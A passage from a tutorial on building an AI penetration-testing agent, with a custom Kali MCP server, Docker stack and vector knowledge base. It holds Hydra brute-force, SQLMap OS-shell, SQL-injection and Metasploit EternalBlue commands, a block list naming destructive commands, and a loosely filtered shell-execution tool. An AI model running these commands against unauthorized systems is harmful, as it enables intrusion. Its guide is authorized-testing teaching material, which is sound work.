---
title: Build Your Own AI Agent for Penetration Testing
description: AI-powered penetration testing agents using Ollama, Claude Code, open-source frameworks, Kali MCP Server, LangChain, CrewAI, vector databases, and automated pentesting workflows.
navigation:
  icon: i-lucide-brain-circuit
  title: AI Pentesting Agent
---

## Introduction

This tutorial walks you through building a fully functional **AI-powered penetration testing agent** from scratch. You will combine large language models (Ollama, Claude), agent orchestration frameworks (LangChain, CrewAI, AutoGPT), vector databases for pentesting knowledge, and direct integration with Kali Linux tools — all managed through MCP servers and automation pipelines.

::note
This guide is written for **authorized penetration testing only**. Every tool, agent, and automation described here must be used with proper written authorization against systems you own or have explicit permission to test.
::

::tabs
  :::tabs-item{icon="i-lucide-layers" label="Architecture Overview"}
  ```text [AI Pentesting Agent Architecture]
  ┌─────────────────────────────────────────────────────────────────┐
  │                      USER / OPERATOR                            │
  │                    (Pentester Interface)                         │
  └──────────────────────────┬──────────────────────────────────────┘
                             │
  ┌──────────────────────────▼──────────────────────────────────────┐
  │                   ORCHESTRATION LAYER                            │
  │         LangChain / CrewAI / AutoGPT / n8n / Flowise            │
  │                                                                  │
  │  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌───────────────────┐  │
  │  │  Recon   │ │ Scanning │ │ Exploit  │ │ Post-Exploitation │  │
  │  │  Agent   │ │  Agent   │ │  Agent   │ │      Agent        │  │
  │  └────┬─────┘ └────┬─────┘ └────┬─────┘ └────────┬──────────┘  │
  └───────┼────────────┼────────────┼─────────────────┼─────────────┘
          │            │            │                 │
  ┌───────▼────────────▼────────────▼─────────────────▼─────────────┐
  │                      MCP SERVER LAYER                            │
  │            (Model Context Protocol Servers)                      │
  │                                                                  │
  │  ┌─────────┐ ┌──────────┐ ┌─────────┐ ┌─────────────────────┐  │
  │  │  Kali   │ │ Filesystem│ │ Browser │ │  Custom Tool MCP    │  │
  │  │  MCP    │ │   MCP    │ │   MCP   │ │  (Nmap/MSF/SQLMap)  │  │
  │  └────┬────┘ └────┬─────┘ └────┬────┘ └────────┬────────────┘  │
  └───────┼───────────┼────────────┼────────────────┼───────────────┘
          │           │            │                │
  ┌───────▼───────────▼────────────▼────────────────▼───────────────┐
  │                       LLM LAYER                                  │
  │                                                                  │
  │  ┌──────────┐  ┌───────────────┐  ┌──────────────────────────┐  │
  │  │  Ollama  │  │  Claude API   │  │  Local Models (Mistral,  │  │
  │  │ (Local)  │  │  (Claude Code)│  │   Llama, DeepSeek, Qwen) │  │
  │  └──────────┘  └───────────────┘  └──────────────────────────┘  │
  └─────────────────────────────────────────────────────────────────┘
          │
  ┌───────▼─────────────────────────────────────────────────────────┐
  │                   KNOWLEDGE LAYER                                │
  │                                                                  │
  │  ┌──────────┐ ┌──────────┐ ┌───────────┐ ┌──────────────────┐  │
  │  │ ChromaDB │ │ Qdrant   │ │ Pinecone  │ │ Exploit DB /     │  │
  │  │ (Local)  │ │ (Local)  │ │ (Cloud)   │ │ CVE Embeddings   │  │
  │  └──────────┘ └──────────┘ └───────────┘ └──────────────────┘  │
  └─────────────────────────────────────────────────────────────────┘
  ```
  :::

  :::tabs-item{icon="i-lucide-list-checks" label="What You'll Build"}
  - Multi-agent pentesting system with specialized agents for each phase
  - Local LLM integration via Ollama with pentesting-optimized models
  - Claude Code integration for advanced reasoning and code generation
  - MCP server connections to Kali Linux tools
  - Vector database with embedded pentesting knowledge (CVEs, exploits, techniques)
  - Automated reconnaissance, scanning, exploitation, and reporting pipelines
  - Custom tool wrappers for Nmap, Metasploit, SQLMap, Hydra, Nikto, Burp Suite
  - Workflow automation via n8n, Flowise, and LangGraph
  - Multi-agent collaboration with CrewAI
  - Evidence collection and automated report generation
  :::

  :::tabs-item{icon="i-lucide-cpu" label="Requirements"}
  | Component        | Minimum                    | Recommended                 |
  | ---------------- | -------------------------- | --------------------------- |
  | **OS**           | Kali Linux 2024.x          | Kali Linux 2024.x           |
  | **RAM**          | 16 GB                      | 32+ GB                      |
  | **GPU**          | None (CPU inference)       | NVIDIA 8GB+ VRAM            |
  | **Storage**      | 50 GB free                 | 200+ GB SSD                 |
  | **Python**       | 3.10+                      | 3.11+                       |
  | **Docker**       | 24.x                       | 24.x with Compose v2        |
  | **Network**      | Internet access            | Dual NIC (isolated lab)     |
  :::
::

---

## Step 1 — Environment Preparation

### Core Dependencies Installation

::steps{level="4"}

#### Update Kali Linux and install base packages

```bash [Terminal]
sudo apt update && sudo apt upgrade -y
sudo apt install -y python3 python3-pip python3-venv git curl wget jq \
  docker.io docker-compose-v2 nodejs npm build-essential libssl-dev \
  libffi-dev nmap metasploit-framework sqlmap nikto hydra gobuster \
  feroxbuster whatweb wpscan nuclei amass subfinder httpx-toolkit \
  seclists wordlists net-tools tmux
```

#### Install Ollama

```bash [Terminal]
curl -fsSL https://ollama.ai/install.sh | sh
```

```bash [Verify Installation]
ollama --version
```

#### Pull pentesting-optimized models

```bash [Terminal]
ollama pull llama3.1:8b
ollama pull mistral:7b
ollama pull codellama:13b
ollama pull deepseek-coder-v2:16b
ollama pull qwen2.5:14b
ollama pull gemma2:9b
```

#### Create Python virtual environment

```bash [Terminal]
mkdir -p ~/ai-pentest-agent && cd ~/ai-pentest-agent
python3 -m venv venv
source venv/bin/activate
```

#### Install Python dependencies

```bash [Terminal]
pip install --upgrade pip setuptools wheel
pip install langchain langchain-community langchain-core langchain-ollama \
  langchain-anthropic langgraph chromadb qdrant-client pinecone-client \
  crewai crewai-tools openai anthropic ollama sentence-transformers \
  transformers torch flask fastapi uvicorn pydantic python-nmap \
  requests beautifulsoup4 lxml aiohttp websockets paramiko \
  python-dotenv rich prompt_toolkit jinja2 pyyaml markdown \
  pymetasploit3 shodan censys python-whois dnspython
```

#### Install Claude Code (Node.js based)

```bash [Terminal]
npm install -g @anthropic-ai/claude-code
```

#### Configure API keys

```bash [.env]
cat > ~/ai-pentest-agent/.env << 'EOF'
# LLM API Keys
ANTHROPIC_API_KEY=sk-ant-xxxxxxxxxxxxxxxxxxxxx
OPENAI_API_KEY=sk-xxxxxxxxxxxxxxxxxxxxx

# Ollama Configuration
OLLAMA_HOST=http://localhost:11434
OLLAMA_MODEL=llama3.1:8b

# Vector Database
CHROMA_PERSIST_DIR=./data/chromadb
QDRANT_HOST=localhost
QDRANT_PORT=6333

# Pentesting Config
TARGET_SCOPE=192.168.1.0/24
RATE_LIMIT=100
MAX_THREADS=10
EVIDENCE_DIR=./evidence
REPORT_DIR=./reports

# Safety
DRY_RUN=true
REQUIRE_CONFIRMATION=true
ALLOWED_TOOLS=nmap,nikto,gobuster,whatweb,sqlmap
BLOCKED_ACTIONS=rm,format,shutdown,reboot
EOF
```

::

### Docker Compose — Full Stack (Optional)

::code-collapse

```yaml [docker-compose.yml]
version: '3.9'

services:
  # ============================================
  # LLM Layer
  # ============================================
  ollama:
    image: ollama/ollama:latest
    container_name: ai-pentest-ollama
    ports:
      - "11434:11434"
    volumes:
      - ollama_data:/root/.ollama
    deploy:
      resources:
        reservations:
          devices:
            - driver: nvidia
              count: all
              capabilities: [gpu]
    restart: unless-stopped
    networks:
      - ai-pentest-net

  # ============================================
  # Vector Databases
  # ============================================
  chromadb:
    image: chromadb/chroma:latest
    container_name: ai-pentest-chromadb
    ports:
      - "8000:8000"
    volumes:
      - chroma_data:/chroma/chroma
    environment:
      - ANONYMIZED_TELEMETRY=false
      - ALLOW_RESET=true
    restart: unless-stopped
    networks:
      - ai-pentest-net

  qdrant:
    image: qdrant/qdrant:latest
    container_name: ai-pentest-qdrant
    ports:
      - "6333:6333"
      - "6334:6334"
    volumes:
      - qdrant_data:/qdrant/storage
    restart: unless-stopped
    networks:
      - ai-pentest-net

  weaviate:
    image: cr.weaviate.io/semitechnologies/weaviate:latest
    container_name: ai-pentest-weaviate
    ports:
      - "8080:8080"
      - "50051:50051"
    volumes:
      - weaviate_data:/var/lib/weaviate
    environment:
      QUERY_DEFAULTS_LIMIT: 25
      AUTHENTICATION_ANONYMOUS_ACCESS_ENABLED: 'true'
      PERSISTENCE_DATA_PATH: '/var/lib/weaviate'
      DEFAULT_VECTORIZER_MODULE: 'none'
      CLUSTER_HOSTNAME: 'node1'
    restart: unless-stopped
    networks:
      - ai-pentest-net

  # ============================================
  # Automation & Orchestration
  # ============================================
  n8n:
    image: docker.n8n.io/n8nio/n8n:latest
    container_name: ai-pentest-n8n
    ports:
      - "5678:5678"
    volumes:
      - n8n_data:/home/node/.n8n
    environment:
      - N8N_BASIC_AUTH_ACTIVE=true
      - N8N_BASIC_AUTH_USER=admin
      - N8N_BASIC_AUTH_PASSWORD=pentest123
      - WEBHOOK_URL=http://localhost:5678/
    restart: unless-stopped
    networks:
      - ai-pentest-net

  flowise:
    image: flowiseai/flowise:latest
    container_name: ai-pentest-flowise
    ports:
      - "3000:3000"
    volumes:
      - flowise_data:/root/.flowise
    environment:
      - FLOWISE_USERNAME=admin
      - FLOWISE_PASSWORD=pentest123
      - APIKEY_PATH=/root/.flowise
      - LOG_LEVEL=info
    restart: unless-stopped
    networks:
      - ai-pentest-net

  # ============================================
  # API Gateway
  # ============================================
  litellm:
    image: ghcr.io/berriai/litellm:main-latest
    container_name: ai-pentest-litellm
    ports:
      - "4000:4000"
    volumes:
      - ./config/litellm_config.yaml:/app/config.yaml
    command: ["--config", "/app/config.yaml", "--port", "4000"]
    environment:
      - OLLAMA_API_BASE=http://ollama:11434
    depends_on:
      - ollama
    restart: unless-stopped
    networks:
      - ai-pentest-net

  # ============================================
  # MCP Proxy Server
  # ============================================
  mcp-proxy:
    build:
      context: ./mcp-server
      dockerfile: Dockerfile
    container_name: ai-pentest-mcp
    ports:
      - "8100:8100"
    volumes:
      - ./tools:/app/tools
      - ./evidence:/app/evidence
      - /usr/share/nmap:/usr/share/nmap:ro
    environment:
      - MCP_PORT=8100
      - ALLOWED_TOOLS=nmap,nikto,gobuster,whatweb,sqlmap
      - RATE_LIMIT=100
    restart: unless-stopped
    networks:
      - ai-pentest-net

volumes:
  ollama_data:
  chroma_data:
  qdrant_data:
  weaviate_data:
  n8n_data:
  flowise_data:

networks:
  ai-pentest-net:
    driver: bridge
    ipam:
      config:
        - subnet: 172.30.0.0/24
```

::

```bash [Start All Services]
docker compose up -d
```

```bash [Check Service Status]
docker compose ps
```

```bash [Pull Ollama Models Inside Container]
docker exec -it ai-pentest-ollama ollama pull llama3.1:8b
docker exec -it ai-pentest-ollama ollama pull mistral:7b
docker exec -it ai-pentest-ollama ollama pull codellama:13b
```

### LiteLLM Configuration (API Gateway)

```yaml [config/litellm_config.yaml]
model_list:
  - model_name: llama3
    litellm_params:
      model: ollama/llama3.1:8b
      api_base: http://ollama:11434

  - model_name: mistral
    litellm_params:
      model: ollama/mistral:7b
      api_base: http://ollama:11434

  - model_name: codellama
    litellm_params:
      model: ollama/codellama:13b
      api_base: http://ollama:11434

  - model_name: claude-sonnet
    litellm_params:
      model: anthropic/claude-sonnet-4-20250514
      api_key: sk-ant-xxxxxxxxxxxxxxxxxxxxx

  - model_name: deepseek
    litellm_params:
      model: ollama/deepseek-coder-v2:16b
      api_base: http://ollama:11434

litellm_settings:
  drop_params: true
  set_verbose: false

general_settings:
  master_key: sk-pentest-master-key-1234
```

---

## Step 2 — MCP Server Setup & Management

### Understanding MCP (Model Context Protocol)

::note
MCP (Model Context Protocol) is an open standard that lets AI models interact with external tools, file systems, and services through a standardized interface. For pentesting, MCP servers act as the bridge between your AI agent and Kali Linux tools.
::

### Kali MCP Server Configuration

```json [~/.claude/claude_code_config.json]
{
  "mcpServers": {
    "kali-tools": {
      "command": "python3",
      "args": ["/home/kali/ai-pentest-agent/mcp-servers/kali_mcp.py"],
      "env": {
        "ALLOWED_TOOLS": "nmap,nikto,gobuster,whatweb,sqlmap,hydra,wpscan,nuclei",
        "RATE_LIMIT": "100",
        "EVIDENCE_DIR": "/home/kali/ai-pentest-agent/evidence",
        "DRY_RUN": "false",
        "REQUIRE_CONFIRMATION": "true"
      }
    },
    "filesystem": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-filesystem", "/home/kali/ai-pentest-agent"],
      "env": {}
    },
    "browser": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-puppeteer"],
      "env": {}
    },
    "database": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-sqlite", "/home/kali/ai-pentest-agent/data/pentest.db"],
      "env": {}
    }
  }
}
```

### Custom Kali MCP Server Implementation

```python [mcp-servers/kali_mcp.py]
#!/usr/bin/env python3
"""
Custom MCP Server for Kali Linux Pentesting Tools
Provides a standardized interface for AI agents to interact with security tools.
"""

import asyncio
import json
import os
import subprocess
import shlex
import hashlib
import logging
from datetime import datetime
from pathlib import Path
from typing import Any, Optional

# MCP SDK
from mcp.server import Server
from mcp.server.stdio import stdio_server
from mcp.types import (
    Tool, TextContent, ImageContent,
    CallToolResult, ListToolsResult
)

# Configuration
ALLOWED_TOOLS = os.getenv("ALLOWED_TOOLS", "nmap,nikto,gobuster,whatweb").split(",")
RATE_LIMIT = int(os.getenv("RATE_LIMIT", "100"))
EVIDENCE_DIR = Path(os.getenv("EVIDENCE_DIR", "./evidence"))
DRY_RUN = os.getenv("DRY_RUN", "false").lower() == "true"
REQUIRE_CONFIRMATION = os.getenv("REQUIRE_CONFIRMATION", "true").lower() == "true"
BLOCKED_COMMANDS = ["rm", "format", "shutdown", "reboot", "mkfs", "dd", ":(){ :|:& };:"]

# Setup
EVIDENCE_DIR.mkdir(parents=True, exist_ok=True)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger("kali-mcp")

# Rate limiter
command_history: list[float] = []


def check_rate_limit() -> bool:
    """Enforce rate limiting on tool execution."""
    now = datetime.now().timestamp()
    command_history[:] = [t for t in command_history if now - t < 60]
    if len(command_history) >= RATE_LIMIT:
        return False
    command_history.append(now)
    return True


def is_safe_command(command: str) -> bool:
    """Validate command safety before execution."""
    cmd_lower = command.lower().strip()
    for blocked in BLOCKED_COMMANDS:
        if blocked in cmd_lower:
            return False
    # Check if the base tool is allowed
    base_tool = cmd_lower.split()[0] if cmd_lower else ""
    if base_tool not in ALLOWED_TOOLS and base_tool not in ["echo", "cat", "grep", "head", "tail", "wc"]:
        return False
    return True


def save_evidence(tool_name: str, command: str, output: str) -> str:
    """Save command output as evidence."""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    evidence_hash = hashlib.md5(output.encode()).hexdigest()[:8]
    filename = f"{timestamp}_{tool_name}_{evidence_hash}.txt"
    filepath = EVIDENCE_DIR / filename

    evidence_data = {
        "timestamp": datetime.now().isoformat(),
        "tool": tool_name,
        "command": command,
        "output_length": len(output),
        "hash": evidence_hash,
        "output": output
    }

    filepath.write_text(json.dumps(evidence_data, indent=2))
    logger.info(f"Evidence saved: {filepath}")
    return str(filepath)


async def execute_tool(command: str, timeout: int = 300) -> dict:
    """Execute a system command with safety checks."""
    if not check_rate_limit():
        return {"error": "Rate limit exceeded. Wait before sending more commands.", "output": ""}

    if not is_safe_command(command):
        return {"error": f"Command blocked by safety filter: {command}", "output": ""}

    if DRY_RUN:
        return {"output": f"[DRY RUN] Would execute: {command}", "error": ""}

    logger.info(f"Executing: {command}")

    try:
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await asyncio.wait_for(
            process.communicate(), timeout=timeout
        )

        output = stdout.decode('utf-8', errors='replace')
        error = stderr.decode('utf-8', errors='replace')

        # Save evidence
        tool_name = command.split()[0]
        save_evidence(tool_name, command, output + error)

        return {"output": output, "error": error, "returncode": process.returncode}

    except asyncio.TimeoutError:
        return {"error": f"Command timed out after {timeout}s: {command}", "output": ""}
    except Exception as e:
        return {"error": str(e), "output": ""}


# Initialize MCP Server
app = Server("kali-pentest-mcp")


@app.list_tools()
async def list_tools() -> list[Tool]:
    """Register all available pentesting tools."""
    return [
        Tool(
            name="nmap_scan",
            description="Run Nmap network scanner. Supports all scan types: -sT, -sU, -sV, -sC, -A, --script, etc.",
            inputSchema={
                "type": "object",
                "properties": {
                    "target": {"type": "string", "description": "Target IP, hostname, or CIDR range"},
                    "arguments": {"type": "string", "description": "Nmap arguments (e.g., '-sT -p 80,443 -sV -sC')"},
                    "output_format": {"type": "string", "enum": ["normal", "xml", "grep"], "default": "normal"}
                },
                "required": ["target", "arguments"]
            }
        ),
        Tool(
            name="nikto_scan",
            description="Run Nikto web server vulnerability scanner.",
            inputSchema={
                "type": "object",
                "properties": {
                    "target": {"type": "string", "description": "Target URL or IP"},
                    "port": {"type": "integer", "description": "Target port", "default": 80},
                    "arguments": {"type": "string", "description": "Additional Nikto arguments"}
                },
                "required": ["target"]
            }
        ),
        Tool(
            name="gobuster_scan",
            description="Run Gobuster for directory/DNS/vhost brute forcing.",
            inputSchema={
                "type": "object",
                "properties": {
                    "target": {"type": "string", "description": "Target URL"},
                    "mode": {"type": "string", "enum": ["dir", "dns", "vhost", "fuzz"], "default": "dir"},
                    "wordlist": {"type": "string", "description": "Wordlist path", "default": "/usr/share/wordlists/dirb/common.txt"},
                    "arguments": {"type": "string", "description": "Additional arguments"}
                },
                "required": ["target"]
            }
        ),
        Tool(
            name="sqlmap_scan",
            description="Run SQLMap SQL injection scanner.",
            inputSchema={
                "type": "object",
                "properties": {
                    "target_url": {"type": "string", "description": "Target URL with parameter (e.g., 'http://target/page?id=1')"},
                    "arguments": {"type": "string", "description": "SQLMap arguments (e.g., '--dbs --batch')"},
                    "level": {"type": "integer", "description": "Test level (1-5)", "default": 1},
                    "risk": {"type": "integer", "description": "Risk level (1-3)", "default": 1}
                },
                "required": ["target_url"]
            }
        ),
        Tool(
            name="hydra_attack",
            description="Run Hydra password brute force attack.",
            inputSchema={
                "type": "object",
                "properties": {
                    "target": {"type": "string", "description": "Target IP or hostname"},
                    "service": {"type": "string", "description": "Service to attack (ssh, ftp, http-get, etc.)"},
                    "username": {"type": "string", "description": "Username or username file path"},
                    "password_list": {"type": "string", "description": "Password file path"},
                    "arguments": {"type": "string", "description": "Additional Hydra arguments"}
                },
                "required": ["target", "service"]
            }
        ),
        Tool(
            name="whatweb_scan",
            description="Run WhatWeb web technology fingerprinter.",
            inputSchema={
                "type": "object",
                "properties": {
                    "target": {"type": "string", "description": "Target URL"},
                    "aggression": {"type": "integer", "description": "Aggression level (1-4)", "default": 1}
                },
                "required": ["target"]
            }
        ),
        Tool(
            name="nuclei_scan",
            description="Run Nuclei vulnerability scanner with templates.",
            inputSchema={
                "type": "object",
                "properties": {
                    "target": {"type": "string", "description": "Target URL or file with URLs"},
                    "templates": {"type": "string", "description": "Template tags or paths (e.g., 'cve,critical')"},
                    "arguments": {"type": "string", "description": "Additional Nuclei arguments"}
                },
                "required": ["target"]
            }
        ),
        Tool(
            name="custom_command",
            description="Execute a custom shell command (must use allowed tools only).",
            inputSchema={
                "type": "object",
                "properties": {
                    "command": {"type": "string", "description": "Full command to execute"},
                    "timeout": {"type": "integer", "description": "Timeout in seconds", "default": 300}
                },
                "required": ["command"]
            }
        ),
        Tool(
            name="read_evidence",
            description="Read previously saved evidence files.",
            inputSchema={
                "type": "object",
                "properties": {
                    "filename": {"type": "string", "description": "Evidence filename or 'latest' or 'list'"}
                },
                "required": ["filename"]
            }
        )
    ]


@app.call_tool()
async def call_tool(name: str, arguments: dict) -> list[TextContent]:
    """Handle tool execution requests."""

    if name == "nmap_scan":
        target = shlex.quote(arguments["target"])
        args = arguments.get("arguments", "-sT -sV")
        fmt = arguments.get("output_format", "normal")
        output_flag = {"xml": "-oX -", "grep": "-oG -"}.get(fmt, "")
        cmd = f"nmap {args} {output_flag} {target}"
        result = await execute_tool(cmd, timeout=600)

    elif name == "nikto_scan":
        target = arguments["target"]
        port = arguments.get("port", 80)
        extra = arguments.get("arguments", "")
        cmd = f"nikto -h {shlex.quote(target)} -p {port} {extra}"
        result = await execute_tool(cmd, timeout=600)

    elif name == "gobuster_scan":
        target = shlex.quote(arguments["target"])
        mode = arguments.get("mode", "dir")
        wordlist = arguments.get("wordlist", "/usr/share/wordlists/dirb/common.txt")
        extra = arguments.get("arguments", "")
        cmd = f"gobuster {mode} -u {target} -w {shlex.quote(wordlist)} {extra} --no-error -q"
        result = await execute_tool(cmd, timeout=600)

    elif name == "sqlmap_scan":
        url = shlex.quote(arguments["target_url"])
        args = arguments.get("arguments", "--batch")
        level = arguments.get("level", 1)
        risk = arguments.get("risk", 1)
        cmd = f"sqlmap -u {url} --level={level} --risk={risk} {args}"
        result = await execute_tool(cmd, timeout=900)

    elif name == "hydra_attack":
        target = shlex.quote(arguments["target"])
        service = shlex.quote(arguments["service"])
        user = arguments.get("username", "admin")
        passlist = arguments.get("password_list", "/usr/share/wordlists/rockyou.txt")
        extra = arguments.get("arguments", "-t 4 -V")
        if os.path.isfile(user):
            user_flag = f"-L {shlex.quote(user)}"
        else:
            user_flag = f"-l {shlex.quote(user)}"
        cmd = f"hydra {user_flag} -P {shlex.quote(passlist)} {target} {service} {extra}"
        result = await execute_tool(cmd, timeout=900)

    elif name == "whatweb_scan":
        target = shlex.quote(arguments["target"])
        aggression = arguments.get("aggression", 1)
        cmd = f"whatweb -a {aggression} {target}"
        result = await execute_tool(cmd, timeout=120)

    elif name == "nuclei_scan":
        target = shlex.quote(arguments["target"])
        templates = arguments.get("templates", "")
        extra = arguments.get("arguments", "")
        template_flag = f"-tags {templates}" if templates else ""
        cmd = f"nuclei -u {target} {template_flag} {extra} -silent"
        result = await execute_tool(cmd, timeout=900)

    elif name == "custom_command":
        cmd = arguments["command"]
        timeout = arguments.get("timeout", 300)
        result = await execute_tool(cmd, timeout=timeout)

    elif name == "read_evidence":
        filename = arguments["filename"]
        if filename == "list":
            files = sorted(EVIDENCE_DIR.glob("*.txt"), key=os.path.getmtime, reverse=True)
            result = {"output": "\n".join(f.name for f in files[:50]), "error": ""}
        elif filename == "latest":
            files = sorted(EVIDENCE_DIR.glob("*.txt"), key=os.path.getmtime, reverse=True)
            if files:
                result = {"output": files[0].read_text(), "error": ""}
            else:
                result = {"output": "No evidence files found.", "error": ""}
        else:
            filepath = EVIDENCE_DIR / filename
            if filepath.exists():
                result = {"output": filepath.read_text(), "error": ""}
            else:
                result = {"output": "", "error": f"File not found: {filename}"}
    else:
        result = {"output": "", "error": f"Unknown tool: {name}"}

    output_text = result.get("output", "")
    error_text = result.get("error", "")
    combined = f"{output_text}\n{error_text}".strip() if error_text else output_text

    return [TextContent(type="text", text=combined)]


async def main():
    """Start the MCP server."""
    logger.info("Starting Kali Pentest MCP Server...")
    logger.info(f"Allowed tools: {ALLOWED_TOOLS}")
    logger.info(f"Rate limit: {RATE_LIMIT}/min")
    logger.info(f"Dry run: {DRY_RUN}")
    logger.info(f"Evidence dir: {EVIDENCE_DIR}")
    async with stdio_server() as (read_stream, write_stream):
        await app.run(read_stream, write_stream)


if __name__ == "__main__":
    asyncio.run(main())
```

### MCP Server Dependencies

```txt [mcp-servers/requirements.txt]
mcp>=1.0.0
asyncio
pydantic>=2.0
```

```bash [Install MCP Dependencies]
cd ~/ai-pentest-agent
pip install -r mcp-servers/requirements.txt
```

### Test MCP Server

```bash [Test MCP Server Locally]
python3 mcp-servers/kali_mcp.py
```

```bash [Test with Claude Code]
cd ~/ai-pentest-agent
claude --mcp-config ~/.claude/claude_code_config.json
```

---

## Step 3 — Vector Databases & Embeddings

### Pentesting Knowledge Base Architecture

::note
Vector databases store embedded representations of pentesting knowledge — CVE descriptions, exploit details, tool documentation, attack methodologies, and vulnerability patterns. This gives your AI agent the ability to perform **semantic search** over your entire knowledge base, finding relevant techniques based on context rather than exact keyword matching.
::

### ChromaDB Setup (Local — Recommended for Starting)

```python [knowledge/chroma_setup.py]
#!/usr/bin/env python3
"""
ChromaDB setup for pentesting knowledge base.
Embeds CVE data, exploit techniques, and tool documentation.
"""

import chromadb
from chromadb.config import Settings
from sentence_transformers import SentenceTransformer
import json
import os
from pathlib import Path

# Initialize ChromaDB
PERSIST_DIR = os.getenv("CHROMA_PERSIST_DIR", "./data/chromadb")
Path(PERSIST_DIR).mkdir(parents=True, exist_ok=True)

client = chromadb.PersistentClient(path=PERSIST_DIR)

# Use a security-focused embedding model
# all-MiniLM-L6-v2 is fast and works well for technical content
embedding_model = SentenceTransformer('all-MiniLM-L6-v2')


class ChromaEmbeddingFunction:
    """Custom embedding function for ChromaDB."""
    def __init__(self, model):
        self.model = model

    def __call__(self, input: list[str]) -> list[list[float]]:
        embeddings = self.model.encode(input)
        return embeddings.tolist()


embed_fn = ChromaEmbeddingFunction(embedding_model)


def create_collections():
    """Create pentesting knowledge collections."""

    # CVE Database
    cve_collection = client.get_or_create_collection(
        name="cve_database",
        embedding_function=embed_fn,
        metadata={"description": "CVE vulnerability database with descriptions and exploit info"}
    )

    # Exploit Techniques
    exploit_collection = client.get_or_create_collection(
        name="exploit_techniques",
        embedding_function=embed_fn,
        metadata={"description": "Exploitation techniques, payloads, and methodologies"}
    )

    # Tool Documentation
    tools_collection = client.get_or_create_collection(
        name="tool_documentation",
        embedding_function=embed_fn,
        metadata={"description": "Kali Linux tool usage, flags, and examples"}
    )

    # Attack Patterns (MITRE ATT&CK)
    mitre_collection = client.get_or_create_collection(
        name="mitre_attack",
        embedding_function=embed_fn,
        metadata={"description": "MITRE ATT&CK techniques and procedures"}
    )

    # Pentesting Methodologies
    methodology_collection = client.get_or_create_collection(
        name="methodologies",
        embedding_function=embed_fn,
        metadata={"description": "OWASP, PTES, OSSTMM pentesting methodologies"}
    )

    return {
        "cve": cve_collection,
        "exploits": exploit_collection,
        "tools": tools_collection,
        "mitre": mitre_collection,
        "methodology": methodology_collection
    }


def seed_tool_documentation(collections):
    """Seed tool documentation into ChromaDB."""

    tool_docs = [
        {
            "id": "nmap-001",
            "document": "Nmap SYN scan (-sS) sends SYN packets to determine port states. Requires root. Fast and stealthy. Usage: nmap -sS -p 1-65535 <target>",
            "metadata": {"tool": "nmap", "category": "scanning", "phase": "reconnaissance"}
        },
        {
            "id": "nmap-002",
            "document": "Nmap service version detection (-sV) probes open ports to determine service and version. Usage: nmap -sV --version-intensity 5 <target>",
            "metadata": {"tool": "nmap", "category": "scanning", "phase": "enumeration"}
        },
        {
            "id": "nmap-003",
            "document": "Nmap NSE scripts (--script) run Lua scripts for vulnerability detection. Categories: auth, broadcast, brute, default, discovery, dos, exploit, external, fuzzer, intrusive, malware, safe, version, vuln. Usage: nmap --script=vuln <target>",
            "metadata": {"tool": "nmap", "category": "scanning", "phase": "vulnerability-assessment"}
        },
        {
            "id": "nmap-004",
            "document": "Nmap UDP scan (-sU) scans UDP ports. Slower than TCP. Common UDP services: DNS(53), SNMP(161), TFTP(69), NTP(123), Syslog(514). Usage: nmap -sU -p 53,161,123,514 <target>",
            "metadata": {"tool": "nmap", "category": "scanning", "phase": "reconnaissance"}
        },
        {
            "id": "sqlmap-001",
            "document": "SQLMap automatic SQL injection detection and exploitation. Supports: MySQL, PostgreSQL, MSSQL, Oracle, SQLite. Usage: sqlmap -u 'http://target/page?id=1' --dbs --batch",
            "metadata": {"tool": "sqlmap", "category": "exploitation", "phase": "exploitation"}
        },
        {
            "id": "sqlmap-002",
            "document": "SQLMap OS shell access via SQL injection. Upload webshell or execute commands. Usage: sqlmap -u 'http://target/page?id=1' --os-shell --batch",
            "metadata": {"tool": "sqlmap", "category": "exploitation", "phase": "exploitation"}
        },
        {
            "id": "hydra-001",
            "document": "Hydra brute force login for SSH. Usage: hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<target> -t 4 -V",
            "metadata": {"tool": "hydra", "category": "brute-force", "phase": "exploitation"}
        },
        {
            "id": "hydra-002",
            "document": "Hydra brute force for HTTP forms. Usage: hydra -l admin -P passwords.txt <target> http-post-form '/login:user=^USER^&pass=^PASS^:F=incorrect' -V",
            "metadata": {"tool": "hydra", "category": "brute-force", "phase": "exploitation"}
        },
        {
            "id": "nikto-001",
            "document": "Nikto web vulnerability scanner checks for dangerous files, outdated software, misconfigurations, and known vulnerabilities. Usage: nikto -h http://<target> -p 80",
            "metadata": {"tool": "nikto", "category": "scanning", "phase": "vulnerability-assessment"}
        },
        {
            "id": "gobuster-001",
            "document": "Gobuster directory brute forcing discovers hidden directories and files on web servers. Usage: gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt -t 50",
            "metadata": {"tool": "gobuster", "category": "enumeration", "phase": "enumeration"}
        },
        {
            "id": "nuclei-001",
            "document": "Nuclei template-based vulnerability scanner. Fast, customizable. Uses YAML templates for detection. Usage: nuclei -u http://<target> -tags cve,critical -silent",
            "metadata": {"tool": "nuclei", "category": "scanning", "phase": "vulnerability-assessment"}
        },
        {
            "id": "metasploit-001",
            "document": "Metasploit Framework exploitation. Search exploits with 'search', use modules with 'use', set options with 'set', run with 'exploit'. Usage: msfconsole -q -x 'search eternalblue; use 0; set RHOSTS <target>; exploit'",
            "metadata": {"tool": "metasploit", "category": "exploitation", "phase": "exploitation"}
        }
    ]

    ids = [d["id"] for d in tool_docs]
    documents = [d["document"] for d in tool_docs]
    metadatas = [d["metadata"] for d in tool_docs]

    collections["tools"].add(ids=ids, documents=documents, metadatas=metadatas)
    print(f"[+] Seeded {len(tool_docs)} tool documentation entries")


def seed_exploit_techniques(collections):
    """Seed common exploit techniques."""

    techniques = [
        {
            "id": "tech-001",
            "document": "SQL Injection: Insert malicious SQL into application queries. Types: Union-based, Error-based, Blind (Boolean/Time), Out-of-band. Test with: ' OR 1=1--, ' UNION SELECT NULL--",
            "metadata": {"category": "web", "severity": "critical", "owasp": "A03:2021"}
        },
        {
            "id": "tech-002",
